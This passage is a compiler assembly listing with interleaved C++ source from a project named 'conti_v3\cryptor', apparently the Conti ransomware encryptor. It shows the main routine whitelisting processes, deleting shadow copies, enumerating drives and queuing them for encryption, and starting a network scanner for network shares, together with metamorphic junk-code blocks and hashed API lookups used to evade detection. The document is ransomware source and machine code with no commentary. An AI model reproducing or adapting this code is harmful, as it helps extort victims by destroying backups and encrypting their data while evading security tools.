	00 00		 lea	 r9, OFFSET FLAT:?g_NetworkThreadPool@@3Uthreadpool_info@@A ; g_NetworkThreadPool
  0082b	4c 89 7c 24 28	 mov	 QWORD PTR [rsp+40], r15
  00830	4c 8d 05 00 00
	00 00		 lea	 r8, OFFSET FLAT:?ThreadpoolHandler@@YAKPEAUthreadpool_info@@@Z ; ThreadpoolHandler
  00837	44 89 7c 24 20	 mov	 DWORD PTR [rsp+32], r15d
  0083c	33 d2		 xor	 edx, edx
  0083e	33 c9		 xor	 ecx, ecx
  00840	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 163  : 		ThreadPoolInfo->hThreads[i] = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&ThreadpoolHandler, ThreadPoolInfo, 0, NULL);

  00842	48 8b 0d 00 00
	00 00		 mov	 rcx, QWORD PTR ?g_NetworkThreadPool@@3Uthreadpool_info@@A
  00849	48 89 04 d9	 mov	 QWORD PTR [rcx+rbx*8], rax
  0084d	48 ff c3	 inc	 rbx
  00850	48 3b 1d 08 00
	00 00		 cmp	 rbx, QWORD PTR ?g_NetworkThreadPool@@3Uthreadpool_info@@A+8
  00857	72 b7		 jb	 SHORT $LL956@WinMain
$LN955@WinMain:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00859	c7 45 87 c1 9b
	17 00		 mov	 DWORD PTR _morph_var$21[rbp-169], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  00860	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00865	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$21[rbp-169]
  00868	f7 e9		 imul	 ecx
  0086a	8b c2		 mov	 eax, edx
  0086c	c1 e8 1f	 shr	 eax, 31
  0086f	03 d0		 add	 edx, eax
  00871	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00874	3b c8		 cmp	 ecx, eax
  00876	74 47		 je	 SHORT $LN973@WinMain

; 49   : 		_morph_var += (int)a + 2;

  00878	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$21[rbp-169]
  0087b	83 c1 02	 add	 ecx, 2
  0087e	03 ce		 add	 ecx, esi
  00880	89 4d 87	 mov	 DWORD PTR _morph_var$21[rbp-169], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00883	8b 45 87	 mov	 eax, DWORD PTR _morph_var$21[rbp-169]
  00886	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  0088b	7d 07		 jge	 SHORT $LN1201@WinMain
  0088d	ff c8		 dec	 eax
  0088f	83 c8 fc	 or	 eax, -4
  00892	ff c0		 inc	 eax
$LN1201@WinMain:
  00894	85 c0		 test	 eax, eax
  00896	75 78		 jne	 SHORT $LN7@WinMain
  00898	0f 1f 84 00 00
	00 00 00	 npad	 8
$LL965@WinMain:
  008a0	8b 45 87	 mov	 eax, DWORD PTR _morph_var$21[rbp-169]
  008a3	ff c0		 inc	 eax
  008a5	89 45 87	 mov	 DWORD PTR _morph_var$21[rbp-169], eax
  008a8	8b 45 87	 mov	 eax, DWORD PTR _morph_var$21[rbp-169]
  008ab	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  008b0	7d 07		 jge	 SHORT $LN1200@WinMain
  008b2	ff c8		 dec	 eax
  008b4	83 c8 fc	 or	 eax, -4
  008b7	ff c0		 inc	 eax
$LN1200@WinMain:
  008b9	85 c0		 test	 eax, eax
  008bb	74 e3		 je	 SHORT $LL965@WinMain

; 51   : 	}

  008bd	eb 51		 jmp	 SHORT $LN7@WinMain
$LN973@WinMain:

; 52   : 	else if (_morph_var % 2) {

  008bf	8b 45 87	 mov	 eax, DWORD PTR _morph_var$21[rbp-169]

; 53   : 		_morph_var -= (int)a - 2;

  008c2	b9 02 00 00 00	 mov	 ecx, 2
  008c7	8b 45 87	 mov	 eax, DWORD PTR _morph_var$21[rbp-169]
  008ca	2b ce		 sub	 ecx, esi
  008cc	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  008ce	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  008d3	89 4d 87	 mov	 DWORD PTR _morph_var$21[rbp-169], ecx
  008d6	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$21[rbp-169]
  008d9	f7 e9		 imul	 ecx
  008db	8b c2		 mov	 eax, edx
  008dd	c1 e8 1f	 shr	 eax, 31
  008e0	03 d0		 add	 edx, eax
  008e2	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  008e5	3b c8		 cmp	 ecx, eax
  008e7	75 27		 jne	 SHORT $LN7@WinMain
  008e9	0f 1f 80 00 00
	00 00		 npad	 7
$LL967@WinMain:
  008f0	8b 45 87	 mov	 eax, DWORD PTR _morph_var$21[rbp-169]
  008f3	ff c0		 inc	 eax
  008f5	89 45 87	 mov	 DWORD PTR _morph_var$21[rbp-169], eax
  008f8	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  008fd	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$21[rbp-169]
  00900	f7 e9		 imul	 ecx
  00902	8b c2		 mov	 eax, edx
  00904	c1 e8 1f	 shr	 eax, 31
  00907	03 d0		 add	 edx, eax
  00909	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0090c	3b c8		 cmp	 ecx, eax
  0090e	74 e0		 je	 SHORT $LL967@WinMain
$LN7@WinMain:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 299  : 	TAILQ_INIT(&PidList);

  00910	48 8d 45 ff	 lea	 rax, QWORD PTR PidList$[rbp-169]
  00914	4c 89 7d ff	 mov	 QWORD PTR PidList$[rbp-169], r15

; 300  : 	process_killer::GetWhiteListProcess(&PidList);

  00918	48 8d 4d ff	 lea	 rcx, QWORD PTR PidList$[rbp-169]
  0091c	48 89 45 07	 mov	 QWORD PTR PidList$[rbp-161], rax
  00920	e8 00 00 00 00	 call	 ?GetWhiteListProcess@process_killer@@YAXPEAUPID_LIST@1@@Z ; process_killer::GetWhiteListProcess

; 301  : 	cryptor::SetWhiteListProcess(&PidList);

  00925	48 8d 45 ff	 lea	 rax, QWORD PTR PidList$[rbp-169]

; 302  : 	cryptor::DeleteShadowCopies(0);

  00929	33 c9		 xor	 ecx, ecx
  0092b	48 89 05 00 00
	00 00		 mov	 QWORD PTR ?g_WhitelistPids@@3PEAUPID_LIST@process_killer@@EA, rax ; g_WhitelistPids
  00932	e8 00 00 00 00	 call	 ?DeleteShadowCopies@cryptor@@YAFPEAX@Z ; cryptor::DeleteShadowCopies

; 303  : 
; 304  : 	if (global::GetEncryptMode() == ALL_ENCRYPT || global::GetEncryptMode() == LOCAL_ENCRYPT) {

  00937	8b 05 00 00 00
	00		 mov	 eax, DWORD PTR ?g_EncryptMode@@3HA ; g_EncryptMode
  0093d	83 c0 f6	 add	 eax, -10		; fffffff6H
  00940	83 f8 01	 cmp	 eax, 1
  00943	0f 87 64 02 00
	00		 ja	 $LN1218@WinMain

; 305  : 
; 306  : 		if (filesystem::EnumirateDrives(&DriveList)) {

  00949	48 8d 4d ef	 lea	 rcx, QWORD PTR DriveList$[rbp-169]
  0094d	e8 00 00 00 00	 call	 ?EnumirateDrives@filesystem@@YAHPEAUdrive_list_@1@@Z ; filesystem::EnumirateDrives
  00952	85 c0		 test	 eax, eax
  00954	0f 84 53 02 00
	00		 je	 $LN1218@WinMain
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  0095a	c7 45 87 c1 9b
	17 00		 mov	 DWORD PTR _morph_var$19[rbp-169], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  00961	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00966	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$19[rbp-169]
  00969	f7 e9		 imul	 ecx
  0096b	8b c2		 mov	 eax, edx
  0096d	c1 e8 1f	 shr	 eax, 31
  00970	03 d0		 add	 edx, eax
  00972	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00975	3b c8		 cmp	 ecx, eax
  00977	74 46		 je	 SHORT $LN1019@WinMain

; 49   : 		_morph_var += (int)a + 2;

  00979	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$19[rbp-169]
  0097c	8b 45 ef	 mov	 eax, DWORD PTR DriveList$[rbp-169]
  0097f	83 c0 02	 add	 eax, 2
  00982	03 c8		 add	 ecx, eax
  00984	89 4d 87	 mov	 DWORD PTR _morph_var$19[rbp-169], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00987	8b 45 87	 mov	 eax, DWORD PTR _morph_var$19[rbp-169]
  0098a	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  0098f	7d 07		 jge	 SHORT $LN1198@WinMain
  00991	ff c8		 dec	 eax
  00993	83 c8 fc	 or	 eax, -4
  00996	ff c0		 inc	 eax
$LN1198@WinMain:
  00998	85 c0		 test	 eax, eax
  0099a	75 74		 jne	 SHORT $LN1018@WinMain
  0099c	0f 1f 40 00	 npad	 4
$LL1011@WinMain:
  009a0	8b 45 87	 mov	 eax, DWORD PTR _morph_var$19[rbp-169]
  009a3	ff c0		 inc	 eax
  009a5	89 45 87	 mov	 DWORD PTR _morph_var$19[rbp-169], eax
  009a8	8b 45 87	 mov	 eax, DWORD PTR _morph_var$19[rbp-169]
  009ab	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  009b0	7d 07		 jge	 SHORT $LN1197@WinMain
  009b2	ff c8		 dec	 eax
  009b4	83 c8 fc	 or	 eax, -4
  009b7	ff c0		 inc	 eax
$LN1197@WinMain:
  009b9	85 c0		 test	 eax, eax
  009bb	74 e3		 je	 SHORT $LL1011@WinMain

; 51   : 	}

  009bd	eb 51		 jmp	 SHORT $LN1018@WinMain
$LN1019@WinMain:

; 52   : 	else if (_morph_var % 2) {

  009bf	8b 45 87	 mov	 eax, DWORD PTR _morph_var$19[rbp-169]

; 53   : 		_morph_var -= (int)a - 2;

  009c2	b9 02 00 00 00	 mov	 ecx, 2
  009c7	2b 4d ef	 sub	 ecx, DWORD PTR DriveList$[rbp-169]
  009ca	8b 45 87	 mov	 eax, DWORD PTR _morph_var$19[rbp-169]
  009cd	03 c1		 add	 eax, ecx
  009cf	89 45 87	 mov	 DWORD PTR _morph_var$19[rbp-169], eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  009d2	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  009d7	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$19[rbp-169]
  009da	f7 e9		 imul	 ecx
  009dc	8b c2		 mov	 eax, edx
  009de	c1 e8 1f	 shr	 eax, 31
  009e1	03 d0		 add	 edx, eax
  009e3	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  009e6	3b c8		 cmp	 ecx, eax
  009e8	75 26		 jne	 SHORT $LN1018@WinMain
  009ea	66 0f 1f 44 00
	00		 npad	 6
$LL1013@WinMain:
  009f0	8b 45 87	 mov	 eax, DWORD PTR _morph_var$19[rbp-169]
  009f3	ff c0		 inc	 eax
  009f5	89 45 87	 mov	 DWORD PTR _morph_var$19[rbp-169], eax
  009f8	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  009fd	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$19[rbp-169]
  00a00	f7 e9		 imul	 ecx
  00a02	8b c2		 mov	 eax, edx
  00a04	c1 e8 1f	 shr	 eax, 31
  00a07	03 d0		 add	 edx, eax
  00a09	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00a0c	3b c8		 cmp	 ecx, eax
  00a0e	74 e0		 je	 SHORT $LL1013@WinMain
$LN1018@WinMain:

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00a10	c7 45 87 c1 9b
	17 00		 mov	 DWORD PTR _morph_var$20[rbp-169], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  00a17	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00a1c	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$20[rbp-169]
  00a1f	f7 e9		 imul	 ecx
  00a21	8b c2		 mov	 eax, edx
  00a23	c1 e8 1f	 shr	 eax, 31
  00a26	03 d0		 add	 edx, eax
  00a28	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00a2b	3b c8		 cmp	 ecx, eax
  00a2d	8b 45 87	 mov	 eax, DWORD PTR _morph_var$20[rbp-169]
  00a30	74 3d		 je	 SHORT $LN996@WinMain

; 49   : 		_morph_var += (int)a + 2;

  00a32	83 c0 02	 add	 eax, 2
  00a35	89 45 87	 mov	 DWORD PTR _morph_var$20[rbp-169], eax

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00a38	8b 45 87	 mov	 eax, DWORD PTR _morph_var$20[rbp-169]
  00a3b	f7 45 87 03 00
	00 80		 test	 DWORD PTR _morph_var$20[rbp-169], -2147483645 ; ffffffff80000003H
  00a42	75 6c		 jne	 SHORT $LN995@WinMain
  00a44	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL988@WinMain:
  00a50	8b 45 87	 mov	 eax, DWORD PTR _morph_var$20[rbp-169]
  00a53	ff c0		 inc	 eax
  00a55	89 45 87	 mov	 DWORD PTR _morph_var$20[rbp-169], eax
  00a58	8b 45 87	 mov	 eax, DWORD PTR _morph_var$20[rbp-169]
  00a5b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00a60	7d 07		 jge	 SHORT $LN1194@WinMain
  00a62	ff c8		 dec	 eax
  00a64	83 c8 fc	 or	 eax, -4
  00a67	ff c0		 inc	 eax
$LN1194@WinMain:
  00a69	85 c0		 test	 eax, eax
  00a6b	74 e3		 je	 SHORT $LL988@WinMain

; 51   : 	}

  00a6d	eb 41		 jmp	 SHORT $LN995@WinMain
$LN996@WinMain:

; 53   : 		_morph_var -= (int)a - 2;

  00a6f	8b 45 87	 mov	 eax, DWORD PTR _morph_var$20[rbp-169]
  00a72	83 c0 02	 add	 eax, 2
  00a75	89 45 87	 mov	 DWORD PTR _morph_var$20[rbp-169], eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  00a78	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00a7d	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$20[rbp-169]
  00a80	f7 e9		 imul	 ecx
  00a82	8b c2		 mov	 eax, edx
  00a84	c1 e8 1f	 shr	 eax, 31
  00a87	03 d0		 add	 edx, eax
  00a89	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00a8c	3b c8		 cmp	 ecx, eax
  00a8e	75 20		 jne	 SHORT $LN995@WinMain
$LL990@WinMain:
  00a90	8b 45 87	 mov	 eax, DWORD PTR _morph_var$20[rbp-169]
  00a93	ff c0		 inc	 eax
  00a95	89 45 87	 mov	 DWORD PTR _morph_var$20[rbp-169], eax
  00a98	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00a9d	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$20[rbp-169]
  00aa0	f7 e9		 imul	 ecx
  00aa2	8b c2		 mov	 eax, edx
  00aa4	c1 e8 1f	 shr	 eax, 31
  00aa7	03 d0		 add	 edx, eax
  00aa9	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00aac	3b c8		 cmp	 ecx, eax
  00aae	74 e0		 je	 SHORT $LL990@WinMain
$LN995@WinMain:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 314  : 			TAILQ_FOREACH(DriveInfo, &DriveList, Entries) {

  00ab0	48 8b 5d ef	 mov	 rbx, QWORD PTR DriveList$[rbp-169]
  00ab4	48 85 db	 test	 rbx, rbx
  00ab7	0f 84 f0 00 00
	00		 je	 $LN1218@WinMain
  00abd	0f 1f 00	 npad	 3
$LL10@WinMain:

; 315  : 
; 316  : 				threadpool::PutTask(threadpool::LOCAL_THREADPOOL, DriveInfo->RootPath);

  00ac0	48 8b d3	 mov	 rdx, rbx
  00ac3	48 8d 4d cf	 lea	 rcx, QWORD PTR $T13[rbp-169]
  00ac7	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  00acc	48 8b d0	 mov	 rdx, rax
  00acf	33 c9		 xor	 ecx, ecx
  00ad1	e8 00 00 00 00	 call	 ?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z ; threadpool::PutTask
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

  00ad6	48 83 7b 18 07	 cmp	 QWORD PTR [rbx+24], 7

; 2235 :         const value_type* _Result = _Bx._Buf;

  00adb	4c 8b c3	 mov	 r8, rbx

; 2236 :         if (_Large_mode_engaged()) {

  00ade	76 03		 jbe	 SHORT $LN831@WinMain

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

  00ae0	4c 8b 03	 mov	 r8, QWORD PTR [rbx]
$LN831@WinMain:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00ae3	c7 45 87 c1 9b
	17 00		 mov	 DWORD PTR _morph_var$24[rbp-169], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  00aea	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00aef	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$24[rbp-169]
  00af2	f7 e9		 imul	 ecx
  00af4	8b c2		 mov	 eax, edx
  00af6	c1 e8 1f	 shr	 eax, 31
  00af9	03 d0		 add	 edx, eax
  00afb	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00afe	3b c8		 cmp	 ecx, eax
  00b00	74 4d		 je	 SHORT $LN846@WinMain

; 49   : 		_morph_var += (int)a + 2;

  00b02	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$24[rbp-169]
  00b05	83 c1 02	 add	 ecx, 2
  00b08	41 03 c8	 add	 ecx, r8d
  00b0b	89 4d 87	 mov	 DWORD PTR _morph_var$24[rbp-169], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00b0e	8b 45 87	 mov	 eax, DWORD PTR _morph_var$24[rbp-169]
  00b11	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00b16	7d 07		 jge	 SHORT $LN1192@WinMain
  00b18	ff c8		 dec	 eax
  00b1a	83 c8 fc	 or	 eax, -4
  00b1d	ff c0		 inc	 eax
$LN1192@WinMain:
  00b1f	85 c0		 test	 eax, eax
  00b21	75 7d		 jne	 SHORT $LN8@WinMain
  00b23	0f 1f 40 00 66
	0f 1f 84 00 00
	00 00 00	 npad	 13
$LL838@WinMain:
  00b30	8b 45 87	 mov	 eax, DWORD PTR _morph_var$24[rbp-169]
  00b33	ff c0		 inc	 eax
  00b35	89 45 87	 mov	 DWORD PTR _morph_var$24[rbp-169], eax
  00b38	8b 45 87	 mov	 eax, DWORD PTR _morph_var$24[rbp-169]
  00b3b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00b40	7d 07		 jge	 SHORT $LN1191@WinMain
  00b42	ff c8		 dec	 eax
  00b44	83 c8 fc	 or	 eax, -4
  00b47	ff c0		 inc	 eax
$LN1191@WinMain:
  00b49	85 c0		 test	 eax, eax
  00b4b	74 e3		 je	 SHORT $LL838@WinMain

; 51   : 	}

  00b4d	eb 51		 jmp	 SHORT $LN8@WinMain
$LN846@WinMain:

; 52   : 	else if (_morph_var % 2) {

  00b4f	8b 45 87	 mov	 eax, DWORD PTR _morph_var$24[rbp-169]

; 53   : 		_morph_var -= (int)a - 2;

  00b52	b9 02 00 00 00	 mov	 ecx, 2
  00b57	8b 45 87	 mov	 eax, DWORD PTR _morph_var$24[rbp-169]
  00b5a	41 2b c8	 sub	 ecx, r8d
  00b5d	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  00b5f	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00b64	89 4d 87	 mov	 DWORD PTR _morph_var$24[rbp-169], ecx
  00b67	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$24[rbp-169]
  00b6a	f7 e9		 imul	 ecx
  00b6c	8b c2		 mov	 eax, edx
  00b6e	c1 e8 1f	 shr	 eax, 31
  00b71	03 d0		 add	 edx, eax
  00b73	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00b76	3b c8		 cmp	 ecx, eax
  00b78	75 26		 jne	 SHORT $LN8@WinMain
  00b7a	66 0f 1f 44 00
	00		 npad	 6
$LL840@WinMain:
  00b80	8b 45 87	 mov	 eax, DWORD PTR _morph_var$24[rbp-169]
  00b83	ff c0		 inc	 eax
  00b85	89 45 87	 mov	 DWORD PTR _morph_var$24[rbp-169], eax
  00b88	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00b8d	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$24[rbp-169]
  00b90	f7 e9		 imul	 ecx
  00b92	8b c2		 mov	 eax, edx
  00b94	c1 e8 1f	 shr	 eax, 31
  00b97	03 d0		 add	 edx, eax
  00b99	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00b9c	3b c8		 cmp	 ecx, eax
  00b9e	74 e0		 je	 SHORT $LL840@WinMain
$LN8@WinMain:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 314  : 			TAILQ_FOREACH(DriveInfo, &DriveList, Entries) {

  00ba0	48 8b 5b 20	 mov	 rbx, QWORD PTR [rbx+32]
  00ba4	48 85 db	 test	 rbx, rbx
  00ba7	0f 85 13 ff ff
	ff		 jne	 $LL10@WinMain
$LN1218@WinMain:

; 317  : 				morphcode((PCHAR)DriveInfo->RootPath.c_str());
; 318  : 
; 319  : 			}
; 320  : 
; 321  : 		}
; 322  : 
; 323  : 	}
; 324  : 
; 325  : 	if (global::GetEncryptMode() == ALL_ENCRYPT || global::GetEncryptMode() == NETWORK_ENCRYPT) {

  00bad	8b 05 00 00 00
	00		 mov	 eax, DWORD PTR ?g_EncryptMode@@3HA ; g_EncryptMode
  00bb3	83 c0 f6	 add	 eax, -10		; fffffff6H
  00bb6	a9 fd ff ff ff	 test	 eax, -3			; fffffffdH
  00bbb	75 05		 jne	 SHORT $LN28@WinMain

; 326  : 
; 327  : 		network_scanner::StartScan();

  00bbd	e8 00 00 00 00	 call	 ?StartScan@network_scanner@@YAXXZ ; network_scanner::StartScan
$LN28@WinMain:

; 328  : 
; 329  : 	}
; 330  : 
; 331  : 	if (threadpool::IsActive(threadpool::LOCAL_THREADPOOL)) {

  00bc2	44 39 3d 10 00
	00 00		 cmp	 DWORD PTR ?g_LocalThreadPool@@3Uthreadpool_info@@A+16, r15d
  00bc9	74 07		 je	 SHORT $LN30@WinMain

; 332  : 		threadpool::Wait(threadpool::LOCAL_THREADPOOL);

  00bcb	33 c9		 xor	 ecx, ecx
  00bcd	e8 00 00 00 00	 call	 ?Wait@threadpool@@YAXH@Z ; threadpool::Wait
$LN30@WinMain:

; 333  : 	}	
; 334  : 	if (threadpool::IsActive(threadpool::NETWORK_THREADPOOL)) {

  00bd2	44 39 3d 10 00
	00 00		 cmp	 DWORD PTR ?g_NetworkThreadPool@@3Uthreadpool_info@@A+16, r15d
  00bd9	0f 84 dd 00 00
	00		 je	 $LN872@WinMain
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 265  : 	for (SIZE_T i = 0; i < ThreadPoolInfo->ThreadsCount; i++) {

  00bdf	4c 39 3d 08 00
	00 00		 cmp	 QWORD PTR ?g_NetworkThreadPool@@3Uthreadpool_info@@A+8, r15
  00be6	49 8b ff	 mov	 rdi, r15
  00be9	0f 86 99 00 00
	00		 jbe	 $LN874@WinMain
  00bef	90		 npad	 1
$LL875@WinMain:

; 219  : 	PTASK_INFO Task = new TASK_INFO;

  00bf0	b9 38 00 00 00	 mov	 ecx, 56			; 00000038H
  00bf5	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 396  : 	pFunction = (VOID(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x4f2c3749, 76);//GetProcAddress(hKernel32, OBFA("EnterCriticalSection"));

  00bfa	ba 0f 00 00 00	 mov	 edx, 15
  00bff	0f 57 c0	 xorps	 xmm0, xmm0
  00c02	41 b8 49 37 2c
	4f		 mov	 r8d, 1328297801		; 4f2c3749H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 219  : 	PTASK_INFO Task = new TASK_INFO;

  00c08	48 8b d8	 mov	 rbx, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

  00c0b	0f 11 00	 movups	 XMMWORD PTR [rax], xmm0

; 2648 :         _My_data._Mysize = 0;

  00c0e	4c 89 78 10	 mov	 QWORD PTR [rax+16], r15
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 396  : 	pFunction = (VOID(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x4f2c3749, 76);//GetProcAddress(hKernel32, OBFA("EnterCriticalSection"));

  00c12	44 8d 4a 3d	 lea	 r9d, QWORD PTR [rdx+61]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2649 :         _My_data._Myres  = _Small_string_capacity;

  00c16	48 c7 40 18 07
	00 00 00	 mov	 QWORD PTR [rax+24], 7

; 2650 :         _My_data._Activate_SSO_buffer();
; 2651 : 
; 2652 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 2653 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  00c1e	66 44 89 38	 mov	 WORD PTR [rax], r15w
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 227  : 	Task->Stop = TRUE;

  00c22	c7 40 20 01 00
	00 00		 mov	 DWORD PTR [rax+32], 1
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 396  : 	pFunction = (VOID(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x4f2c3749, 76);//GetProcAddress(hKernel32, OBFA("EnterCriticalSection"));

  00c29	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 397  : 	return pFunction(lpCriticalSection);

  00c2e	48 8d 0d 18 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_NetworkThreadPool@@3Uthreadpool_info@@A+24
  00c35	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 229  : 	TAILQ_INSERT_TAIL(&ThreadPoolInfo->TaskList, Task, Entries);

  00c37	4c 89 7b 28	 mov	 QWORD PTR [rbx+40], r15
  00c3b	48 8d 4b 28	 lea	 rcx, QWORD PTR [rbx+40]
  00c3f	48 8b 05 48 00
	00 00		 mov	 rax, QWORD PTR ?g_NetworkThreadPool@@3Uthreadpool_info@@A+72
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 414  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x992c0884, 74);//GetProcAddress(hKernel32, OBFA("LeaveCriticalSection"));

  00c46	ba 0f 00 00 00	 mov	 edx, 15
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 229  : 	TAILQ_INSERT_TAIL(&ThreadPoolInfo->TaskList, Task, Entries);

  00c4b	48 89 43 30	 mov	 QWORD PTR [rbx+48], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 414  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x992c0884, 74);//GetProcAddress(hKernel32, OBFA("LeaveCriticalSection"));

  00c4f	41 b8 84 08 2c
	99		 mov	 r8d, -1725167484	; 992c0884H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 229  : 	TAILQ_INSERT_TAIL(&ThreadPoolInfo->TaskList, Task, Entries);

  00c55	48 8b 05 48 00
	00 00		 mov	 rax, QWORD PTR ?g_NetworkThreadPool@@3Uthreadpool_info@@A+72
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

